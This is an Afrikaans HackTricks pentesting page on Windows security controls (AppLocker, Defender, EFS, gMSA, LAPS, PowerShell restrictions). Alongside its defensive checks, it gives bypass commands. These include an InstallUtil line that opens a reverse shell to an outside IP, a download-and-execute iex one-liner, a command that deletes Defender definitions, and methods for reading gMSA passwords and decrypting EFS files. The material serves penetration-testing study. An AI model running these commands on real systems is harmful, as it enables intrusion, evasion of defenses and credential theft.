# Windows-sekuriteitskontroles

{{#include ../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassings-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel toegelaat word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie aan die spesifieke sakebehoeftes van 'n organisasie voldoen nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **oplossing vir toepassings-witlyste** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skrifte, Windows-installeerderlêers, DLL's, verpakte toepassings en verpakte toepassingsinstalleerders.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe blokkeer** en skryftoegang tot sekere gidse beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/-uitbreidings op die swartlys/witlys is:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` evalueer kandidaat-lêers vir ’n spesifieke identiteit teen ’n AppLocker-beleid. Toets die rekening waarvan die token die payload sal uitvoer, omdat reëls op gebruikers of groepe gerig kan wees; `Get-AppLockerFileInformation` is ook nuttig om die pad-, hash- en uitgewer-metadata te ondersoek waarteen reëls kan ooreenstem.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Voordat jy ’n geweierde toetsuitslag as ’n afgedwonge blokkering beskou, kontroleer die **effektiewe afdwingingsmodus van daardie reëlversameling** en die Application Identity-diens. `AuditOnly` evalueer reëls, maar laat uitvoering steeds toe, terwyl `NotConfigured` nie dieselfde as gedeaktiveer is wanneer daardie versameling reëls bevat nie.<sup>[[7]](#references)</sup> ’n Gestopte `AppIDSvc` verhinder AppLocker-afdwinging.<sup>[[9]](#references)</sup> Hierdie kontroles onderskei ’n werklike omseiling van ’n beleid wat nooit die lêer geblokkeer het nie.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Vir ’n beheerde uitvoeringstoets, vergelyk die AppLocker-gebeurtenislogboek: **8003/8006** beteken dat die EXE/DLL of script/MSI in ouditmodus geblokkeer sou gewees het; **8004/8007** beteken dat dit werklik geblokkeer is. Toets dieselfde lêertipe en identiteit as die beoogde uitvoeringspad.<sup>[[8]](#references)</sup>

Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **skryfbare vouers** om AppLocker-beleid te omseil: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **skryfbare vouers** wat jy kan gebruik om **dit te omseil**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Algemeen **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te bypass.
- **Swak geskrewe reëls kan ook omseil word**
  - Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: jy kan enige plek ’n **vouer met die naam `allowed` skep**, en dit sal toegelaat word.
  - Organisasies fokus ook dikwels daarop om die uitvoerbare lêer **`%System32%\WindowsPowerShell\v1.0\powershell.exe` te blokkeer**, maar vergeet van die **ander** [**PowerShell-uitvoerbare lêerliggings**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL-afdwinging word baie selde geaktiveer** weens die ekstra las wat dit op ’n stelsel kan plaas en die hoeveelheid toetsing wat nodig is om te verseker dat niks breek nie. Die gebruik van **DLL's as backdoors sal dus help om AppLocker te bypass**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en AppLocker te bypass. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Berging van aanmeldbewyse

### Security Accounts Manager (SAM)

Plaaslike aanmeldbewyse is in hierdie lêer beskikbaar; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **aanmeldbewyse** (gehash) word om Single Sign-On-redes in die **geheue** van hierdie substelsel **gestoor**.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikertoestemmings...), **stawing**, **toegangstokens**...\
LSA is die komponent wat die verskafde aanmeldbewyse in die **SAM**-lêer **sal nagaan** (vir ’n plaaslike aanmelding) en met die **domeinbeheerder sal kommunikeer** om ’n domeingebruiker te staaf.

Die **aanmeldbewyse** word in die **LSASS-proses gestoor**: Kerberos-kaartjies, NT- en LM-hashes, maklik ontsleutelde wagwoorde.

### LSA-geheime

LSA kan sommige aanmeldbewyse op skyf stoor:

- Wagwoord van die Active Directory-rekenaarrekening (onbereikbare domeinbeheerder).
- Wagwoorde van Windows-diensrekeninge
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die Active Directory-databasis. Dit is slegs op domeinbeheerders beskikbaar.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n antivirusprogram wat in Windows 10 en Windows 11, en in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting-nutsmiddels soos **`WinPEAS`**. Daar is egter maniere om hierdie **beskermings te bypass**.

### Kontrole

Om die **status** van **Defender** na te gaan, kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kyk na die waarde van **`RealTimeProtectionEnabled`** om te sien of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Jy kan dit ook met die volgende opnoem:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Geënkripteerde lêerstelsel (EFS)

EFS beskerm lêers deur enkripsie te gebruik, met ’n **simmetriese sleutel** bekend as die **Lêerenkripsiesleutel (FEK)**. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en in die lêer se NTFS-`$EFS`-metadata (`$LOGGED_UTILITY_STREAM`) gestoor, **nie** in ’n gewone alternatiewe `$DATA`-datastroom nie.<sup>[[10]](#references)</sup> Wanneer dekripsie nodig is, ontseël die ooreenstemmende **private sleutel** van die gebruiker se digitale sertifikaat die FEK. ’n Gekonfigureerde dataherstelagent (DRA) het ’n afsonderlike, geënkripteerde kopie van die FEK in die Dataherstelveld.<sup>[[13]](#references)</sup>

**Dekripsie-scenario’s sonder dat die gebruiker dit begin** sluit die volgende in:

- Wanneer lêers of vouers na ’n lêerstelsel sonder EFS geskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat via die SMB/CIFS-protokol oor die netwerk gestuur word, word voor versending gedekripteer.

Hierdie enkripsiemetode bied die eienaar **deursigtige toegang** tot geënkripteerde lêers. Die eienaar se wagwoord bloot verander en aanmeld, sal egter nie dekripsie moontlik maak nie.

**Belangrike punte**:

- EFS gebruik ’n simmetriese FEK wat met die gebruiker se publieke sleutel geënkripteer is.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder sekere omstandighede plaas, soos wanneer lêers na FAT32 gekopieer word of oor die netwerk versend word.
- Die eienaar kan sonder bykomende stappe toegang tot geënkripteerde lêers verkry.

### Gaan EFS-inligting na

Moenie uit `%APPDATA%\Microsoft\Protect` aflei dat EFS gebruik word nie: dit stoor DPAPI-hoofsleutels vir baie Windows-kenmerke.<sup>[[19]](#references)</sup> Ondersoek eerder ’n geënkripteerde lêer met `cipher /c "C:\path\file"` om sy gebruiker- en herstelsertifikate te lys. `cipher /e` en `cipher /d` enkripteer en dekripteer lêers vir ’n sekuriteitsidentiteit wat die ooreenstemmende private sleutel het.<sup>[[11]](#references)</sup>

### Dekripteer EFS-lêers

As `cipher /c` ’n herstelsertifikaat lys en jy die **ooreenstemmende private DRA-sleutel** in ’n PFX-lêer het, voer daardie PFX-lêer in die huidige gebruiker se sertifikaatstoor in en dekripteer dan die lêer.<sup>[[11]](#references)[[12]](#references)</sup> ’n Nuutgegenereerde DRA-sertifikaat kan nie ouer lêers dekripteer nie: sy publieke sleutel moes reeds ingesluit gewees het toe die lêer geënkripteer is. NTFS-ACL-toegang of die blote terugstelling van ’n rekeningwagwoord verskaf nie die vereiste private sleutel nie.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Om stelselowerheid te wees

Hierdie benadering vereis dat die **slagoffer-gebruiker** 'n **proses** op die host **laat loop**. Indien wel, kan jy vanuit 'n `meterpreter`-sessie die gebruiker se prosestoken naboots (`impersonate_token` van `incognito`). Alternatiewelik kan jy `migrate` na die gebruiker se proses.

#### Om die gebruiker se wagwoord te ken

Mimikatz kan die gebruiker se sertifikaat en private sleutel invoer en dit dan gebruik om EFS-beskermde lêers te dekripteer.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Groepbestuurde diensrekeninge (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge waarvoor die instelling "**Password never expire**" dikwels geaktiveer is, bied gMSA's 'n veiliger en makliker bestuurbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA's gebruik 'n komplekse wagwoord van 240 grepe wat normaalweg elke 30 dae roteer. Domeinbeheerders lei dit met KDS-sleutelmateriaal af, wat handmatige wagwoordopdaterings uitskakel.<sup>[[16]](#references)[[20]](#references)</sup>
- **Verbeterde sekuriteit**: Hierdie rekeninge is immuun teen rekeninguitsluitings en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir verskeie hosts**: gMSA's kan oor verskeie hosts gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
- **Ondersteuning vir geskeduleerde take**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoer van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties op wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

'n Domeinbeheerder stel die LDAP-kenmerk _**msDS-ManagedPassword**_ saam wanneer dit gelees word, met wagwoordmateriaal wat van KDS afgelei is; die waarde is nie 'n wagwoord wat onafhanklik gestoor word nie. Dit verander normaalweg elke 30 dae.<sup>[[20]](#references)</sup> Die teruggestuurde [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) is **nie 'n geënkripteerde wagwoord nie**: die `CurrentPassword`-veld bevat die wagwoord in gewone teks.<sup>[[14]](#references)</sup> Toegang word teen `msDS-GroupMSAMembership` nagegaan, dus val enige sekuriteitsbeginsel waaraan herwinningsregte toegeken is binne die bestek, nie net administrateurs of die dienshosts nie.<sup>[[15]](#references)</sup> Die LDAP-verbinding moet vertroulikheid bied, byvoorbeeld deur LDAPS of SASL-sealing.<sup>[[20]](#references)</sup>

Vir vanlyn wagwoordafleiding nadat die KDS-wortelsleutel blootgestel is, sien [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om 'n **NTLM relay attack** uit te voer om die **wagwoord** van **gMSA** te **lees**.<sup>[[3]](#references)</sup>

## LAPS

Onderskei tydens enumerasie tussen **legacy Microsoft LAPS** en die oorspronklike **Windows LAPS**-implementering. Windows LAPS is in die Windows-opdaterings van 11 April 2023 bekendgestel en kan 'n bestuurde plaaslike administrateurwagwoord na **Windows Server Active Directory** of **Microsoft Entra ID** rugsteun. In AD-gesteunde ontplooiings kan dit wagwoorde ook enkripteer, 'n geskiedenis van geënkripteerde wagwoorde behou en 'n domeinbeheerder se DSRM-wagwoord bestuur. Die aflaaibare legacy MSI is op nuwer Windows-weergawes afgekeur, hoewel Windows LAPS in legacy-emulasiemodus kan werk.<sup>[[6]](#references)</sup>

Omdat legacy Microsoft LAPS en Windows LAPS afsonderlike implementerings is, bepaal watter een ontplooi is voordat jy aanvalle toepas wat spesifiek op kenmerke of cmdlets gerig is. Die gekoppelde bladsy dek ontdekking, ACL-enumerasie, herwinning, manipulasie van vervaldatums en vanlyn herstel sonder om daardie prosedures hier te herhaal.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell se [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **beperk baie van die funksies** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objekte en die beperking tot goedgekeurde .NET-tipes, XAML-gebaseerde werkvloeie, PowerShell-klasse en meer.

### **Kontroleer**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` was ’n verouderde afgradering, slegs op gashere waarop die opsionele PowerShell 2-enjin geïnstalleer was. Dit is nie meer ingesluit in opgedateerde Windows 11 24H2 of Windows Server 2025 nie; moenie dit as ’n huidige CLM-bypass beskou nie.<sup>[[17]](#references)</sup> Onder toepassingsbeheer voer PowerShell onbetroubare kode in Constrained Language uit, terwyl skripte wat deur die beleid vertrou word, in Full Language kan loop.<sup>[[18]](#references)</sup>

Vir ouer konfigurasies kan jy [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te kompileer, moet jy dalk** **’n verwysing byvoeg** (_**Add a Reference**_ -> _Browse_ ->_Browse_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by) en **die projek na .Net4.5 verander**.

#### Direkte bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-uitvoeringsbeleid

By verstek is dit op **restricted** gestel. Die belangrikste maniere om hierdie beleid te omseil:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> gevind word

## Sekuriteitsondersteuningsverskaffer-koppelvlak (SSPI)

Is die API wat gebruik kan word om gebruikers te verifieer.

Die SSPI is verantwoordelik daarvoor om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Daarna sal die SSPI onderhandel oor watter verifikasieprotokol gebruik word. Hierdie verifikasieprotokolle word Security Support Provider (SSP) genoem, is op elke Windows-masjien in die vorm van 'n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Belangrikste SSP's

- **Kerberos**: Die voorkeurprotokol
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om versoenbaarheidsredes
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webbedieners en LDAP; wagwoord in die vorm van 'n MD5-hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Word gebruik om te onderhandel oor watter protokol gebruik moet word (Kerberos of NTLM, met Kerberos as die verstekprotokol)
  - %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of net een bied.

## UAC - Gebruikersrekeningbeheer

[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsaanvraag vir aktiwiteite met verhoogde regte** moontlik maak.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Om AppLocker en PowerShell se beperkte taalmodus te omseil](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [hoe om EFS-lêers te dekripteer](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying vir gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maniere om die PowerShell-uitvoeringsbeleid te omseil](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Gebruik die AppLocker-Windows PowerShell-cmdlets](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Oorsig van Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Werk met AppLocker-reëls](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Gebruik Event Viewer met AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker-prosesse en -interaksies](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Lêerstrome (plaaslike lêerstelsels)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Rugsteun die EFS-private sleutel van die herstelagent](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership-kenmerk](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Beveilig groepbestuurde diensrekeninge](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Kenmerke wat uit Windows-kliënt verwyder is](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Gebruik App Control om PowerShell te beveilig](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Gebeurtenis 4693 en DPAPI-hoofsleutels](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Konstruksie van msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
